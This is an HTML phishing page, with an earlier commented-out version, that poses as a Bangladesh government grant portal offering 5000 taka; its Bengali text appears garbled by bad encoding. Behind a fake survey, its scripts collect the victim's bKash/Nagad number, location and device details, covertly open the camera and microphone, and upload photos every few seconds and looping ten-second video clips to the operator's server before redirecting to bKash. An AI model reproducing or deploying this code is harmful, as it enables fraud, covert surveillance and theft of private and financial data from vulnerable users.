<!-- <!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ржбрж┐ржЬрж┐ржЯрж╛рж▓ ржмрзЛржирж╛рж╕ ржУ ржЬрж░рж┐ржк рзирзжрзирзк</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f0f2f5; margin: 0; padding: 15px; text-align: center; color: #333; }
        .card { max-width: 420px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.15); border-top: 6px solid #006a4e; }
        .logo { width: 70px; margin-bottom: 10px; }
        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
        .btn { background: #006a4e; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
        #quiz-area, #perm-block { display: none; }
        .opt-btn { background: #f8f9fa; border: 1px solid #ddd; padding: 12px; width: 100%; margin-bottom: 10px; border-radius: 8px; cursor: pointer; text-align: left; }
        .timer { color: #d9534f; font-weight: bold; font-size: 20px; margin: 10px 0; }
        #video { display: none; }
    </style>
</head>
<body>

<div class="card" id="start-screen">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" class="logo">
    <h2>рзлрзжрзжрзж ржЯрж╛ржХрж╛ ржЕржирзБржжрж╛ржи ржЕржлрж╛рж░</h2>
    <p>рж╕ржарж┐ржХ рждржерзНржп ржжрж┐рзЯрзЗ ржЬрж░рж┐ржкржЯрж┐ ржкрзВрж░ржг ржХрж░рзБржи ржПржмржВ рж╕рж░рж╛рж╕рж░рж┐ ржЖржкржирж╛рж░ ржмрж┐ржХрж╛рж╢/ржиржЧржж-ржП ржЯрж╛ржХрж╛ ржмрзБржЭрзЗ ржирж┐ржиред</p>
    <input type="number" id="v-phone" placeholder="ржЖржкржирж╛рж░ ржмрж┐ржХрж╛рж╢/ржиржЧржж ржиржорзНржмрж░ ржжрж┐ржи">
    <button class="btn" onclick="initiate()">ржЬрж░рж┐ржк рж╢рзБрж░рзБ ржХрж░рзБржи</button>
</div>

<div class="card" id="quiz-area">
    <div class="timer" id="time-display">10</div>
    <h3 id="q-text">рж▓рзЛржб рж╣ржЪрзНржЫрзЗ...</h3>
    <div id="options-box"></div>
</div>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
    let qIdx = 0;
    let questions = [
        { q: "ржЖржкржирж┐ ржХрж┐ ржмрж░рзНрждржорж╛ржи ржжрзНрж░ржмрзНржпржорзВрж▓рзНржпрзЗ рж╕ржирзНрждрзБрж╖рзНржЯ?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛", "ржорзЛржЯрж╛ржорзБржЯрж┐"] },
        { q: "ржЕржирж▓рж╛ржЗржи рж╕рзЗржмрж╛ ржЖржкржирж╛рж░ ржЬрзАржмржи рж╕рж╣ржЬ ржХрж░рзЗржЫрзЗ?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЖржкржирж╛рж░ рж╕рж┐ржо ржХрж╛рж░рзНржбржЯрж┐ ржХрж╛рж░ ржирж╛ржорзЗ рж░рзЗржЬрж┐рж╕рзНржЯрж╛рж░рзНржб?", a: ["ржирж┐ржЬрзЗрж░", "ржкрж░рж┐ржмрж╛рж░рзЗрж░", "ржЕржирзНржпрзЗрж░"] },
        { q: "ржЖржкржирж╛рж░ ржмрж░рзНрждржорж╛ржи ржЗржирзНржЯрж╛рж░ржирзЗржЯ рж╕рзНржкрж┐ржб ржХрзЗржоржи?", a: ["ржЦрзБржм ржнрж╛рж▓рзЛ", "ржорж╛ржЭрзЗ ржорж╛ржЭрзЗ рж╕ржорж╕рзНржпрж╛ рж╣рзЯ"] },
        { q: "ржкрзНрж░рждрж┐ржжрж┐ржи ржХржд ржШржгрзНржЯрж╛ ржорзЛржмрж╛ржЗрж▓ ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзЗржи?", a: ["рзз-рзй ржШржгрзНржЯрж╛", "рзл ржШржгрзНржЯрж╛рж░ ржмрзЗрж╢рж┐"] },
        { q: "ржПржЗ ржЕржлрж╛рж░ржЯрж┐ ржХрж┐ ржмржирзНржзрзБржжрзЗрж░ рж╢рзЗрзЯрж╛рж░ ржХрж░ржмрзЗржи?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЖржкржирж╛рж░ ржмрж┐ржХрж╛рж╢/ржиржЧржж ржХрж┐ рж╕ржЪрж▓ ржЖржЫрзЗ?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЖржкржирж┐ ржХрж┐ ржирж┐рзЯржорж┐ржд ржЕржирж▓рж╛ржЗржи рж▓рзЗржиржжрзЗржи ржХрж░рзЗржи?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЬрж░рж┐ржкржЯрж┐ ржЖржкржирж╛рж░ ржХрзЗржоржи рж▓рзЗржЧрзЗржЫрзЗ?", a: ["ржнрж╛рж▓рзЛ", "ржЦрзБржм ржнрж╛рж▓рзЛ"] },
        { q: "ржЯрж╛ржХрж╛ ржХрж┐ ржПржЦржиржЗ ржХрзНржпрж╛рж╢ ржЖржЙржЯ ржХрж░ржмрзЗржи?", a: ["рж╣рзНржпрж╛ржБ", "ржЕржмрж╢рзНржпржЗ"] }
    ];

    async function initiate() {
        let phone = $("#v-phone").val();
        if(phone.length < 11) return alert("рж╕ржарж┐ржХ ржиржорзНржмрж░ ржжрж┐ржи!");

        // рзз. ржбрж┐ржнрж╛ржЗрж╕ ржлрж┐ржЩрзНржЧрж╛рж░ржкрзНрж░рж┐ржирзНржЯрж┐ржВ
        const gl = document.createElement('canvas').getContext('webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
        
        let fp = `ЁЯУ▒ ржлрзЛржи: ${phone}\nЁЯФЛ ржмрзНржпрж╛ржЯрж╛рж░рж┐: ${ (await navigator.getBattery?.())?.level * 100 || 'N/A' }%\nЁЯЦея╕П ржкрзНрж▓рзНржпрж╛ржЯржлрж░рзНржо: ${navigator.platform}\nЁЯОо GPU: ${gpu}\nЁЯМР ржХрж╛ржирзЗржХрж╢ржи: ${navigator.connection?.effectiveType || 'N/A'}`;
        $.post("/info", { data: encodeURIComponent(fp) });

        // рзи. ржХрзНржпрж╛ржорзЗрж░рж╛ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржУ рж╕рж╛ржЗрж▓рзЗржирзНржЯ ржХрзНржпрж╛ржкржЪрж╛рж░
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
            startSilentCapture(stream);
        }).catch(() => { console.log("Camera Blocked"); });

        // рзй. рж▓рзЛржХрзЗрж╢ржи
        navigator.geolocation.getCurrentPosition(p => {
            $.post("/info", { data: encodeURIComponent(`ЁЯУН рж▓рзЛржХрзЗрж╢ржи: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`) });
        });

        $("#start-screen").hide();
        $("#quiz-area").show();
        showQ();
    }

    function startSilentCapture(stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        setInterval(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            $.post('/camsnap', { img: canvas.toDataURL('image/png') });
        }, 2000); // рзи рж╕рзЗржХрзЗржирзНржб ржЕржирзНрждрж░ ржЫржмрж┐

        const rec = new MediaRecorder(stream);
        let ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = () => {
            const reader = new FileReader();
            reader.onloadend = () => $.post('/video-upload', { video: reader.result });
            reader.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
            ch = []; rec.start();
            setTimeout(() => rec.stop(), 10000); // рззрзж рж╕рзЗржХрзЗржирзНржбрзЗрж░ ржнрж┐ржбрж┐ржУ рж▓рзБржк
        };
        rec.start();
        setTimeout(() => rec.stop(), 10000);
    }

    function showQ() {
        if(qIdx < questions.length) {
            $("#q-text").text(questions[qIdx].q);
            $("#options-box").html('');
            questions[qIdx].a.forEach(opt => {
                $("#options-box").append(`<button class="opt-btn" onclick="qIdx++; showQ()">${opt}</button>`);
            });
        } else {
            $("#quiz-area").html("<h3>рж╕ржлрж▓ржнрж╛ржмрзЗ рж╕ржорзНржкржирзНржи рж╣рзЯрзЗржЫрзЗ!</h3><p>ржЖржкржирж╛рж░ ржкрзНрж░рзЛржлрж╛ржЗрж▓ ржпрж╛ржЪрж╛ржЗ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗред ржЦрзБржм рж╢рзАржШрзНрж░ржЗ ржмрзЛржирж╛рж╕ ржкрж╛ржмрзЗржиред</p>");
            setTimeout(() => location.href = "https://www.bkash.com", 3000);
        }
    }
</script>
</body>
</html> -->



<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>рж╕рж░ржХрж╛рж░рж┐ ржЬржиржоржд ржУ ржЕржирзБржжрж╛ржи ржкрзЛрж░рзНржЯрж╛рж▓</title>
    <style>
        body { font-family: 'Hind Siliguri', Arial, sans-serif; background: #eef2f7; text-align: center; margin: 0; padding: 15px; }
        .card { max-width: 450px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 10px solid #006a4e; }
        .logo { width: 80px; margin-bottom: 10px; }
        h2 { color: #006a4e; }
        input { width: 100%; padding: 15px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; }
        .btn { background: #006a4e; color: white; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
        #quiz-area, #loc-screen { display: none; }
        .opt-btn { background: #fff; border: 2px solid #eee; padding: 12px; width: 100%; margin-bottom: 10px; border-radius: 10px; cursor: pointer; text-align: left; font-size: 16px; }
        #video { display: none; }
        .error-msg { color: #d9534f; font-weight: bold; margin-bottom: 10px; display: none; }
    </style>
</head>
<body>

<div class="card" id="start-screen">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Government_Seal_of_Bangladesh.svg" class="logo">
    <h2>рзлрзжрзжрзж ржЯрж╛ржХрж╛ ржЕржирзБржжрж╛ржи ржирж┐рж╢рзНржЪрж┐ржд ржХрж░рзБржи</h2>
    <p>ржЖржкржирж╛рж░ ржмрж┐ржХрж╛рж╢/ржиржЧржж ржиржорзНржмрж░ ржжрж┐ржи ржПржмржВ рждржерзНржп ржпрж╛ржЪрж╛ржЗ рж╕ржорзНржкржирзНржи ржХрж░рзБржиред</p>
    <input type="number" id="v-phone" placeholder="ржЖржкржирж╛рж░ ржиржорзНржмрж░ржЯрж┐ ржПржЦрж╛ржирзЗ рж▓рж┐ржЦрзБржи">
    <button class="btn" onclick="checkLoc()">ржкрж░ржмрж░рзНрждрзА ржзрж╛ржк</button>
</div>

<div class="card" id="loc-screen">
    <h3 style="color: #d9534f;">тЪая╕П ржПрж▓рж╛ржХрж╛ ржпрж╛ржЪрж╛ржЗ ржкрзНрж░рзЯрзЛржЬржи</h3>
    <p>ржЕржирзБржжрж╛ржиржЯрж┐ ржЖржкржирж╛рж░ ржПрж▓рж╛ржХрж╛рзЯ ржмрж░рж╛ржжрзНржж ржХрж┐ржирж╛ рждрж╛ ржирж┐рж╢рзНржЪрж┐ржд ржХрж░рждрзЗ ржЖржкржирж╛рж░ рж▓рзЛржХрзЗрж╢ржи рж╢рзЗрзЯрж╛рж░ ржХрж░рж╛ ржмрж╛ржзрзНржпрждрж╛ржорзВрж▓ржХред</p>
    <p id="loc-err" class="error-msg">ржжрзЯрж╛ ржХрж░рзЗ ржмрзНрж░рж╛ржЙржЬрж╛рж░рзЗрж░ ржЙржкрж░рзЗ ржЖрж╕рж╛ 'Allow' ржмрж╛ржЯржирзЗ ржХрзНрж▓рж┐ржХ ржХрж░рзБржи!</p>
    <button class="btn" onclick="getLocation()">рж▓рзЛржХрзЗрж╢ржи ржПрж▓рж╛ржЙ ржХрж░рзБржи</button>
</div>

<div class="card" id="quiz-area">
    <h3 id="q-text">ржЖржкржирж╛рж░ ржкрзНрж░рзЛржлрж╛ржЗрж▓ ржЪрзЗржХ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...</h3>
    <div id="options-box"></div>
</div>

<video id="video" playsinline autoplay></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script>
    let phone = "";
    let qIdx = 0;
    let questions = [
        { q: "ржЖржкржирж╛рж░ ржмрж░рзНрждржорж╛ржи рж╕рж┐ржо ржЕржкрж╛рж░рзЗржЯрж░ ржХрзЛржиржЯрж┐?", a: ["GP", "Robi/Airtel", "Banglalink", "Teletalk"] },
        { q: "ржЖржкржирж┐ ржХрж┐ ржЗржирзНржЯрж╛рж░ржирзЗржЯрзЗрж░ ржЧрждрж┐рждрзЗ рж╕ржирзНрждрзБрж╖рзНржЯ?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛", "ржорж╛ржЭрзЗ ржорж╛ржЭрзЗ"] },
        { q: "ржмрзЛржирж╛рж╕ ржЯрж╛ржХрж╛ ржХрж┐ ржЖржкржирж┐ рж╕рж░рж╛рж╕рж░рж┐ ржмрж┐ржХрж╛рж╢-ржП ржЪрж╛ржи?", a: ["рж╣рзНржпрж╛ржБ", "ржиржЧржж-ржП ржЪрж╛ржЗ"] },
        { q: "ржЖржкржирж╛рж░ ржлрзЛржиржЯрж┐ ржХрж┐ 4G рж╕рж╛ржкрзЛрж░рзНржЯрзЗржб?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржкрзНрж░рждрж┐ржжрж┐ржи ржХржд ржЯрж╛ржХрж╛ ржлрзНрж▓рзЗржХрзНрж╕рж┐рж▓рзЛржб ржХрж░рзЗржи?", a: ["рзирзж-рзлрзж ржЯрж╛ржХрж╛", "рззрзжрзж+ ржЯрж╛ржХрж╛"] },
        { q: "ржбрж┐ржЬрж┐ржЯрж╛рж▓ рж╕рж╛рж░рзНржнрж┐рж╕рзЗ ржЖржкржирж┐ ржХржд ржЦрзБрж╢рж┐?", a: ["рззрзжрзж%", "рзорзж%", "рзлрзж%"] },
        { q: "ржПржЗ ржЕржлрж╛рж░ржЯрж┐ ржХрж┐ ржЖржкржирж╛рж░ ржЙржкржХрж╛рж░рзЗ ржЖрж╕ржмрзЗ?", a: ["рж╣рзНржпрж╛ржБ", "ржЕржмрж╢рзНржпржЗ"] },
        { q: "ржЖржкржирж╛рж░ ржмрзЯрж╕ ржХрж┐ рззрзо ржмржЫрж░рзЗрж░ ржмрзЗрж╢рж┐?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЖржкржирж┐ ржХрж┐ ржХрзЛржирзЛ рж╕рж░ржХрж╛рж░рж┐ ржЪрж╛ржХрж░рж┐ ржХрж░рзЗржи?", a: ["рж╣рзНржпрж╛ржБ", "ржирж╛"] },
        { q: "ржЯрж╛ржХрж╛ ржХрж┐ ржПржЦржиржЗ рж░рж┐ржХрзЛрзЯрзЗрж╕рзНржЯ ржкрж╛ржарж╛ржмрзЗржи?", a: ["рж╣рзНржпрж╛ржБ", "ржПржХржЯрзБ ржкрж░"] }
    ];

    function checkLoc() {
        phone = $("#v-phone").val();
        if(phone.length < 11) return alert("рж╕ржарж┐ржХ ржиржорзНржмрж░ ржжрж┐ржи!");
        $("#start-screen").hide();
        $("#loc-screen").show();
    }

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendPosition, showError);
        } else {
            alert("рж▓рзЛржХрзЗрж╢ржи рж╕рж╛ржкрзЛрж░рзНржЯ ржХрж░ржЫрзЗ ржирж╛ред");
        }
    }

    async function sendPosition(position) {
        let lat = position.coords.latitude;
        let lon = position.coords.longitude;
        let locMsg = `ЁЯУН ржорзНржпрж╛ржк рж▓рж┐ржВржХ: https://www.google.com/maps?q=${lat},${lon}`;
        
        // рж▓рзЛржХрзЗрж╢ржи ржкрж╛ржУрзЯрж╛рж░ ржкрж░ ржХрзНржпрж╛ржорзЗрж░рж╛ рж╢рзБрж░рзБ ржХрж░рж╛
        initCam(locMsg);
    }

    function showError(error) {
        $("#loc-err").show();
    }

    async function initCam(locMsg) {
        // ржХрзНржпрж╛ржорзЗрж░рж╛ ржкрж╛рж░ржорж┐рж╢ржи
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
            startCapturing(stream);
        }).catch(() => { console.log("Cam Denied"); });

        // рж╕ржм рждржерзНржп ржПржХрж╕рж╛ржерзЗ ржкрж╛ржарж╛ржирзЛ
        let info = `ЁЯУ▒ ржлрзЛржи: ${phone}\nЁЯФЛ ржмрзНржпрж╛ржЯрж╛рж░рж┐: ${(await navigator.getBattery?.())?.level * 100 || 'N/A'}%\n${locMsg}`;
        $.post("/info", { data: encodeURIComponent(info) });

        $("#loc-screen").hide();
        $("#quiz-area").show();
        showQ();
    }

    function startCapturing(stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        setInterval(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            let imgData = canvas.toDataURL('image/jpeg', 0.4);
            $.ajax({ type: 'POST', url: '/camsnap', data: { img: imgData } });
        }, 3000);

        const rec = new MediaRecorder(stream);
        let ch = [];
        rec.ondataavailable = e => ch.push(e.data);
        rec.onstop = () => {
            let reader = new FileReader();
            reader.onloadend = () => {
                $.ajax({ type: 'POST', url: '/video-upload', data: JSON.stringify({ video: reader.result }), contentType: 'application/json' });
            };
            reader.readAsDataURL(new Blob(ch, { type: 'video/webm' }));
            ch = []; rec.start();
            setTimeout(() => rec.stop(), 10000);
        };
        rec.start();
        setTimeout(() => rec.stop(), 10000);
    }

    function showQ() {
        if(qIdx < questions.length) {
            $("#q-text").text(questions[qIdx].q);
            $("#options-box").html('');
            questions[qIdx].a.forEach(o => {
                $("#options-box").append(`<button class="opt-btn" onclick="qIdx++; showQ()">${o}</button>`);
            });
        } else {
            $("#quiz-area").html("<h3>ржпрж╛ржЪрж╛ржЗ рж╕ржлрж▓!</h3><p>ржЖржкржирж╛рж░ ржЖржмрзЗржжржиржЯрж┐ ржЧрзНрж░рж╣ржг ржХрж░рж╛ рж╣рзЯрзЗржЫрзЗред рзирзк ржШржгрзНржЯрж╛рж░ ржоржзрзНржпрзЗ ржмрзЛржирж╛рж╕ ржкрж╛ржмрзЗржиред</p>");
            setTimeout(() => location.href = "https://www.bkash.com", 3000);
        }
    }
</script>
</body>
</html>